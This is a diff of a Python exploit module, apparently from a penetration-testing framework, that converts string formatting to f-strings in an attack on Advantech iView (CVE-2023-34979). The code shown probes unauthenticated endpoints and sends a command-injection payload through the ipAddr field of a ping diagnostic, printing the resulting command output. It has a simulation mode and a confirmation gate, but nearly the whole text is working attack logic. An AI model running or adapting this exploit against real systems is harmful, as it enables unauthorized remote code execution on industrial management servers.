@@ -153,8 +153,8 @@ class Exploit(Exploit):
         """Return True if HTTP response suggests an Advantech iView instance."""
         if not self.target:
             return False
-        base = "http://{}:{}".format(self.target, self.port)
-        status, body = _http_get("{}/api/iView/GetSystemInfo".format(base), timeout=3)
+        base = f"http://{self.target}:{self.port}"
+        status, body = _http_get(f"{base}/api/iView/GetSystemInfo", timeout=3)
         if status in (200, 401, 403) and ("iview" in body.lower() or "advantech" in body.lower()):
             return True
         # Fallback: check root for iView branding
@@ -167,29 +167,23 @@ class Exploit(Exploit):
             print_error("Set 'target' option first.")
             return
 
-        base = "http://{}:{}".format(self.target, self.port)
+        base = f"http://{self.target}:{self.port}"
         rce_payload = _RCE_PAYLOAD_TEMPLATE.format(cmd=self.command)
 
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "CVE-2023-34979 attack chain against Advantech iView at {}:{}:\n"
-                    "  1. Probe {} for pre-auth access (no session required).\n"
+                    f"CVE-2023-34979 attack chain against Advantech iView at {self.target}:{self.port}:\n"
+                    f"  1. Probe {_AUTH_BYPASS_PATHS[0]} for pre-auth access (no session required).\n"
                     "  2. If accessible, enumerate device inventory via GetDeviceList.\n"
-                    "  3. Inject OS command via POST to {} with "
-                    "ipAddr='{}' (command injection in ping diagnostic).\n"
-                    "  4. Output includes result of command '{}' executed as service user.\n"
-                    "CVSS 9.8 — no credentials required.".format(
-                        self.target, self.port,
-                        _AUTH_BYPASS_PATHS[0],
-                        _RCE_ENDPOINT,
-                        rce_payload,
-                        self.command,
-                    )
+                    f"  3. Inject OS command via POST to {_RCE_ENDPOINT} with "
+                    f"ipAddr='{rce_payload}' (command injection in ping diagnostic).\n"
+                    f"  4. Output includes result of command '{self.command}' executed as service user.\n"
+                    "CVSS 9.8 — no credentials required."
                 ),
                 payload_hex="",
                 payload_human=(
-                    "POST {}{} ipAddr='{}'".format(base, _RCE_ENDPOINT, rce_payload)
+                    f"POST {base}{_RCE_ENDPOINT} ipAddr='{rce_payload}'"
                 ),
                 mitre_techniques=["T1190", "T0866"],
             )
@@ -205,31 +199,25 @@ class Exploit(Exploit):
             module_name="cve/cve_2023_34979/cve_2023_34979_advantech_iview",
             target=self.target,
             impact_level="CRITICAL",
-            description="CVE-2023-34979 auth bypass + RCE on {}:{}".format(
-                self.target, self.port
-            ),
+            description=f"CVE-2023-34979 auth bypass + RCE on {self.target}:{self.port}",
         )
         if not confirmed:
             return
 
-        print_status("[CVE-2023-34979] Probing auth bypass on {}:{}...".format(
-            self.target, self.port
-        ))
+        print_status(f"[CVE-2023-34979] Probing auth bypass on {self.target}:{self.port}...")
 
         bypassed = False
         for path in _AUTH_BYPASS_PATHS:
-            status, body = _http_get("{}{}".format(base, path), self.timeout)
+            status, body = _http_get(f"{base}{path}", self.timeout)
             if status == 200 and body.strip():
                 print_success(
-                    "[CVE-2023-34979] Auth bypass confirmed via {} (HTTP {})".format(
-                        path, status
-                    )
+                    f"[CVE-2023-34979] Auth bypass confirmed via {path} (HTTP {status})"
                 )
-                print_info("[CVE-2023-34979] Response snippet: {}...".format(body[:200]))
+                print_info(f"[CVE-2023-34979] Response snippet: {body[:200]}...")
                 bypassed = True
                 break
             else:
-                print_info("[CVE-2023-34979] {} -> HTTP {}".format(path, status))
+                print_info(f"[CVE-2023-34979] {path} -> HTTP {status}")
 
         if not bypassed:
             print_warning("[CVE-2023-34979] Auth bypass not confirmed on this target.")
@@ -237,17 +225,15 @@ class Exploit(Exploit):
 
         print_status("[CVE-2023-34979] Attempting RCE via command injection...")
         status, body = _http_post(
-            "{}{}".format(base, _RCE_ENDPOINT),
+            f"{base}{_RCE_ENDPOINT}",
             {"ipAddr": rce_payload},
             self.timeout,
         )
         if status == 200 and body.strip():
             print_success(
-                "[CVE-2023-34979] RCE response received:\n{}".format(body[:512])
+                f"[CVE-2023-34979] RCE response received:\n{body[:512]}"
             )
         else:
             print_warning(
-                "[CVE-2023-34979] RCE attempt returned HTTP {} — may need path adjustment.".format(
-                    status
-                )
+                f"[CVE-2023-34979] RCE attempt returned HTTP {status} — may need path adjustment."
             )
